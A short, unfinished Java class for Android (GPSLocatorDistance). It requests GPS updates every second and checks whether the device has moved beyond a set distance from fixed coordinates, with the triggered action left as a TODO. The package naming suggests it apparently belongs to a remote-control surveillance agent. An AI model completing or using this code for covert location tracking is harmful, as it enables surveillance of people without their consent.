package com.ht.RCSAndroidGUI.agent.position;

import android.app.PendingIntent;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;

import com.ht.RCSAndroidGUI.Status;

public class GPSLocatorDistance extends GPSLocator implements LocationListener {
	private float latitude;
	private float longitude;
	private float distance;
	private long expiration;
	private PendingIntent intent;
	private LocationListener realListener;
	private Location location;

	public GPSLocatorDistance(LocationListener listener, float latitude,
			float longitude, float distance) {
		super(listener);

		this.latitude = latitude;
		this.longitude = longitude;
		this.distance = distance;
		
	}

	@Override
	public void go(LocationListener listener, LocationManager lm) {
		this.realListener = listener;
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1L,
				this, Looper.getMainLooper());	}

	public void onLocationChanged(Location location) {
		if(this.location == null){
			this.location = new Location(location);
			this.location.setLatitude(latitude);
			this.location.setLongitude(longitude);
		}
		if(this.location.distanceTo(location) > distance){
			//TODO
		}
	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub
		
	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub
		
	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub
		
	}
}
